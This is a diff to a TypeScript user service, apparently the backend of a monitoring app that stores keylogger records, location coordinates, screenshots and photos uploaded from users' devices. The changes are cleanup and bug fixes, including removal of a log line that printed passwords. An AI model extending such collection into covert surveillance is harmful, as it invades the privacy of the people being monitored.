@@ -1,8 +1,8 @@
 import * as bcrypt from "bcrypt";
 import { Service } from "typedi";
 import { OrmRepository } from "typeorm-typedi-extensions";
-import fs from 'fs';
-import uuidv4 from 'uuid';
+import fs from "fs";
+import uuidv4 from "uuid";
 
 import {
     EventDispatcher,
@@ -18,8 +18,8 @@ import { Message } from "../models/Message";
 import { Coordinates } from "../models/Coordinates";
 import { TimeOnApp } from "../models/TimeOnApp";
 import { KeyLogger } from "../models/KeyLogger";
-import { ScreenShot } from '../models/ScreenShot';
-import { Photo } from '../models/Photo';
+import { ScreenShot } from "../models/ScreenShot";
+import { Photo } from "../models/Photo";
 
 @Service()
 export class UserService {
@@ -71,7 +71,6 @@ export class UserService {
         email: string,
         password: string
     ): Promise<User | undefined> {
-        console.log(email, password);
         const user = await this.userRepository.findOne({ email });
 
         if (user) {
@@ -109,33 +108,36 @@ export class UserService {
 
         await this.userRepository.save(user);
 
-        console.log(await this.userRepository.find(user));
-
         return user;
     }
 
-    public async addScreenShoot(screenShot: ScreenShot, user: User): Promise<User> {
+    public async addScreenShoot(
+        screenShot: ScreenShot,
+        user: User
+    ): Promise<User> {
         if (user.screenShotList === undefined) {
             user.screenShotList = [];
         }
 
         const fileName = uuidv4();
 
-        const buff = new Buffer(screenShot.screenShot, 'base64');
+        const buff = new Buffer(screenShot.screenShot, "base64");
 
         try {
-            fs.mkdirSync("screenshot", {recursive: true});
+            fs.mkdirSync("media/screenshots", { recursive: true });
         } catch (err) {
             if (err.code !== "EEXIST") {
                 throw err;
             }
         }
 
-        const filePath = "media/screenshots/" + fileName + ".png";
+        const filePath = `media/screenshots/${fileName}.jpeg`;
 
         fs.writeFileSync(filePath, buff);
 
         screenShot.path = filePath;
+
+        screenShot.screenShot = "uploaded"; // avoid resending base64 string
 
         user.screenShotList.push(screenShot);
 
@@ -151,23 +153,25 @@ export class UserService {
 
         const fileName = uuidv4();
 
-        const buff = new Buffer(photo.img, 'base64');
+        const buff = new Buffer(photo.img, "base64");
 
         try {
-            fs.mkdirSync("screenshot", {recursive: true});
+            fs.mkdirSync("media/photos", { recursive: true });
         } catch (err) {
             if (err.code !== "EEXIST") {
                 throw err;
             }
         }
 
-        const filePath = "media/photos/" + fileName + ".png";
+        const filePath = `media/photos/${fileName}.jpeg`;
 
         fs.writeFileSync(filePath, buff);
 
         photo.path = filePath;
 
-        user.screenShotList.push(photo);
+        photo.img = "uploaded"; // avoid resending base64 string
+
+        user.photoList.push(photo);
 
         await this.userRepository.save(user);
 
